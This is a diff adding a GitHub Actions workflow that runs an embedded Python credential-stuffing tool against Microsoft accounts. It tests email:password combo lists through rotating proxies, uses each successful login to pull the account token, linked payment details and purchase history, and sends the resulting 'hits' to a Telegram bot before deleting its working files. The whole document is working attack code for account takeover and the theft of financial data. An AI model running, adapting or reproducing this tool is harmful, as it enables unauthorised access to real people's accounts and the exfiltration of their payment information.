@@ -1,0 +1,355 @@
+name: Microsoft Full Capture - Telegram Bot
+
+on:
+  workflow_dispatch:
+    inputs:
+      combo_file:
+        description: 'Combo file (email:pass per line) - URL or content'
+        required: true
+        default: 'https://raw.githubusercontent.com/username/repo/main/combos.txt'
+      proxy_file:
+        description: 'Proxy file (ip:port or user:pass@ip:port) - URL or skip'
+        required: false
+        default: ''
+      max_workers:
+        description: 'Max threads (default 10)'
+        required: false
+        default: '10'
+
+jobs:
+  microsoft-capture:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+
+    - name: Setup Python
+      uses: actions/setup-python@v5
+      with:
+        python-version: '3.10'
+
+    - name: Install dependencies
+      run: |
+        pip install requests colorama
+
+    - name: Download combo file
+      run: |
+        if [[ "${{ github.event.inputs.combo_file }}" =~ ^https?:// ]]; then
+          curl -s -L "${{ github.event.inputs.combo_file }}" -o combos.txt
+        else
+          echo "${{ github.event.inputs.combo_file }}" > combos.txt
+        fi
+        echo "Combo lines: $(wc -l < combos.txt)"
+
+    - name: Download proxy file (if provided)
+      if: github.event.inputs.proxy_file != ''
+      run: |
+        if [[ "${{ github.event.inputs.proxy_file }}" =~ ^https?:// ]]; then
+          curl -s -L "${{ github.event.inputs.proxy_file }}" -o proxies.txt
+        else
+          echo "${{ github.event.inputs.proxy_file }}" > proxies.txt
+        fi
+        echo "Proxy lines: $(wc -l < proxies.txt)"
+
+    - name: Run Microsoft Capture
+      id: capture
+      continue-on-error: true
+      run: |
+        cat > microsoft_capture.py << 'EOF'
+        # ============================================================
+        # Microsoft Full Capture + XBOX (GitHub Action version)
+        # Coded by @anasxzer00
+        # ============================================================
+        
+        import requests
+        import re
+        import json
+        import threading
+        import queue
+        import sys
+        import os
+        import random
+        import time
+        from urllib.parse import quote, unquote
+        import traceback
+        
+        # ==============================
+        # Telegram Configuration (from Secrets)
+        # ==============================
+        TELEGRAM_BOT_TOKEN = "${{ secrets.TELEGRAM_BOT_TOKEN }}"
+        TELEGRAM_CHAT_ID = "${{ secrets.TELEGRAM_CHAT_ID }}"
+        
+        def send_telegram_message(message):
+            if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+                return False
+            try:
+                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+                payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
+                response = requests.post(url, json=payload, timeout=10)
+                return response.status_code == 200
+            except:
+                return False
+        
+        def send_telegram_file(filename, caption=""):
+            if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+                return False
+            try:
+                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+                with open(filename, 'rb') as f:
+                    files = {'document': f}
+                    data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption or f'✅ Microsoft Hits: {filename}'}
+                    response = requests.post(url, files=files, data=data, timeout=30)
+                    return response.status_code == 200
+            except:
+                return False
+        
+        anasMax = int("${{ github.event.inputs.max_workers }}" or 10)
+        anasTimeOut = 15
+        anasMaxPer = 100
+        
+        stats = {
+            "hits": 0,
+            "bad": 0,
+            "retries": 0,
+            "two_factor": 0,
+            "checked": 0,
+            "total_combos": 0
+        }
+        
+        anasPPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
+        anasBK = "1665024852"
+        anasUAID = "a5b22c26bc704002ac309462e8d061bb"
+        
+        def anasxzer00(source_text, left_str, right_str, var_name, variables, create_empty=True, prefix="", suffix=""):
+            try:
+                match = re.search(f"{re.escape(left_str)}(.*?){re.escape(right_str)}", source_text, re.DOTALL)
+                if match:
+                    variables[var_name] = f"{prefix}{match.group(1)}{suffix}"
+                    return True
+                else:
+                    if create_empty:
+                        variables[var_name] = ""
+                    return False
+            except:
+                if create_empty:
+                    variables[var_name] = ""
+                return False
+        
+        def anasJsonKey(source_text, key, var_name, variables, create_empty=True, prefix="", suffix=""):
+            try:
+                data = json.loads(source_text)
+                if key in data:
+                    variables[var_name] = f"{prefix}{data[key]}{suffix}"
+                    return True
+                else:
+                    if create_empty:
+                        variables[var_name] = ""
+                    return False
+            except:
+                if create_empty:
+                    variables[var_name] = ""
+                return False
+        
+        def anasRetries(session, method, url, step_name, retries_counter, **kwargs):
+            for attempt in range(anasMaxPer + 1):
+                try:
+                    response = session.request(method, url, timeout=anasTimeOut, **kwargs)
+                    return response
+                except Exception as e:
+                    if attempt < anasMaxPer:
+                        retries_counter[0] += 1
+                        time.sleep(1 + attempt)
+                        continue
+                    else:
+                        raise
+            return None
+        
+        def anasChkAccount(user_pass_line, proxy_dict):
+            user, password = user_pass_line.split(':', 1)
+            variables = {'USER': user, 'PASS': password}
+            session = requests.Session()
+            if proxy_dict:
+                session.proxies = proxy_dict
+            
+            try:
+                url_login = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={quote(user)}&bk={anasBK}&uaid={anasUAID}"
+                payload_login = f"ps=2&PPFT={anasPPFT}&PPSX=PassportRN&NewUser=1&login={quote(user)}&loginfmt={quote(user)}&type=11&LoginOptions=1&passwd={quote(password)}"
+                headers_login = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+                response_login = anasRetries(session, 'POST', url_login, "Login", [0], headers=headers_login, data=payload_login, allow_redirects=True)
+                if not response_login:
+                    return "NETWORK_ERROR", None
+                
+                response_text = response_login.text
+                
+                if "incorrect" in response_text.lower() or "doesn't exist" in response_text.lower():
+                    return "BAD_CREDENTIALS", None
+                if "confirm" in response_text.lower() or "two-factor" in response_text.lower():
+                    return "2FA_REQUIRED", None
+                if "access_token=" in response_login.url:
+                    token_match = re.search(r'access_token=([^&]+)', response_login.url)
+                    if token_match:
+                        variables["Token"] = unquote(token_match.group(1))
+                    else:
+                        return "TOKEN_ERROR", None
+                else:
+                    return "LOGIN_FAILED", None
+                
+                # Payment API
+                url_payment = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
+                headers_payment = {"Authorization": f'MSADELEGATE1.0="{variables["Token"]}"', "User-Agent": "Mozilla/5.0"}
+                resp_payment = anasRetries(session, 'GET', url_payment, "Payment", [0], headers=headers_payment)
+                if resp_payment and resp_payment.status_code == 200:
+                    payment_text = resp_payment.text
+                    anasxzer00(payment_text, 'balance":', ',', "Balance", variables, prefix="$")
+                    anasxzer00(payment_text, 'accountHolderName":"', '"', "CardHolder", variables)
+                    anasxzer00(payment_text, '"country":"', '"', "Country", variables)
+                else:
+                    return "PAYMENT_API_ERROR", None
+                
+                # Transactions
+                url_trans = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
+                resp_trans = anasRetries(session, 'GET', url_trans, "Transactions", [0], headers=headers_payment)
+                if resp_trans and resp_trans.status_code == 200:
+                    trans_text = resp_trans.text
+                    anasxzer00(trans_text, '"title":"', '"', "Item", variables)
+                    anasxzer00(trans_text, '"autoRenew":', ',', "AutoRenew", variables)
+                    anasxzer00(trans_text, '"startDate":"', 'T', "StartDate", variables)
+                    anasxzer00(trans_text, '"nextRenewalDate":"', 'T', "EndDate", variables)
+                else:
+                    return "TRANSACTION_API_ERROR", None
+                
+                country = variables.get("Country", "N/A")
+                card_holder = variables.get("CardHolder", "No CC Linked")
+                balance = variables.get("Balance", "N/A")
+                item = variables.get("Item", "N/A")
+                auto_renew = "Yes" if variables.get("AutoRenew", "false").lower() == "true" else "No"
+                start = variables.get("StartDate", "N/A")
+                end = variables.get("EndDate", "N/A")
+                
+                hit = f"{user_pass_line} | Country = {country} | CardHolder = {card_holder} | CC Funding = {balance} | Purchased Items = [{item}] | Auto Renew = {auto_renew} | Start in = {start} | End in = {end} | by = @anasxzer00"
+                return "HIT", hit
+                
+            except Exception as e:
+                return "ERROR", str(e)[:100]
+        
+        def main():
+            combo_file = "combos.txt"
+            proxy_file = "proxies.txt" if os.path.exists("proxies.txt") else None
+            
+            try:
+                with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    combos = [line.strip() for line in f if ':' in line.strip()]
+            except:
+                print("ERROR: Combo file not found")
+                return
+            
+            stats['total_combos'] = len(combos)
+            print(f"Loaded {len(combos)} combos")
+            
+            proxies = []
+            if proxy_file and os.path.exists(proxy_file):
+                with open(proxy_file, 'r') as f:
+                    proxies = [line.strip() for line in f if line.strip()]
+                print(f"Loaded {len(proxies)} proxies")
+            
+            combo_queue = queue.Queue()
+            for combo in combos:
+                combo_queue.put(combo)
+            
+            hits_file = "Microsoft-Hits.txt"
+            if os.path.exists(hits_file):
+                os.remove(hits_file)
+            
+            def worker():
+                while True:
+                    try:
+                        user_pass = combo_queue.get_nowait()
+                    except queue.Empty:
+                        break
+                    
+                    proxy = None
+                    if proxies:
+                        proxy = {'http': random.choice(proxies), 'https': random.choice(proxies)}
+                    
+                    status, result = anasChkAccount(user_pass, proxy)
+                    
+                    with threading.Lock():
+                        stats['checked'] += 1
+                        if status == "HIT":
+                            stats['hits'] += 1
+                            with open(hits_file, 'a', encoding='utf-8') as f:
+                                f.write(result + '\n')
+                            print(f"[HIT] {user_pass}")
+                        elif status == "BAD_CREDENTIALS":
+                            stats['bad'] += 1
+                        elif status == "2FA_REQUIRED":
+                            stats['two_factor'] += 1
+                        else:
+                            pass
+                    
+                    sys.stdout.write(f"\rChecked: {stats['checked']}/{stats['total_combos']} | Hits: {stats['hits']} | Bad: {stats['bad']} | 2FA: {stats['two_factor']}   ")
+                    sys.stdout.flush()
+                    combo_queue.task_done()
+            
+            threads = []
+            max_workers = min(anasMax, stats['total_combos'])
+            for _ in range(max_workers):
+                t = threading.Thread(target=worker)
+                t.daemon = True
+                threads.append(t)
+                t.start()
+            
+            while stats['checked'] < stats['total_combos']:
+                time.sleep(1)
+            
+            print("\n\n=== FINISHED ===")
+            print(f"Total: {stats['total_combos']}")
+            print(f"Hits: {stats['hits']}")
+            print(f"Bad: {stats['bad']}")
+            print(f"2FA: {stats['two_factor']}")
+            
+            # Send results to Telegram
+            summary = f"<b>✅ Microsoft Full Capture Results</b>\n\nTotal: {stats['total_combos']}\nHits: {stats['hits']}\nBad: {stats['bad']}\n2FA: {stats['two_factor']}\n\nby @anasxzer00"
+            send_telegram_message(summary)
+            
+            # Send hits file if any
+            if stats['hits'] > 0 and os.path.exists(hits_file):
+                send_telegram_file(hits_file, f"✅ Microsoft Hits: {stats['hits']} found")
+                
+                # Also send content as text (in chunks)
+                with open(hits_file, 'r') as f:
+                    content = f.read()
+                for i in range(0, len(content), 4000):
+                    send_telegram_message(f"<b>Hits ({stats['hits']})</b>\n<code>{content[i:i+4000]}</code>")
+        
+        if __name__ == "__main__":
+            main()
+        EOF
+        
+        python3 microsoft_capture.py
+
+    - name: Upload hits
+      if: always()
+      uses: actions/upload-artifact@v4
+      with:
+        name: microsoft-hits
+        path: Microsoft-Hits.txt
+
+    - name: Send final notification to Telegram
+      if: always()
+      run: |
+        if [ -f "Microsoft-Hits.txt" ]; then
+          HITS=$(wc -l < Microsoft-Hits.txt)
+        else
+          HITS=0
+        fi
+        curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
+          -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
+          -d text="✅ <b>Microsoft Full Capture Complete</b>%0A%0AHits: ${HITS}%0AWorkflow: ${{ github.workflow }}%0ARun: ${{ github.run_id }}%0A%0Aby @anasxzer00" \
+          -d parse_mode="HTML" 2>/dev/null || true
+
+    - name: Cleanup
+      if: always()
+      run: |
+        rm -f combos.txt proxies.txt Microsoft-Hits.txt microsoft_capture.py 2>/dev/null || true
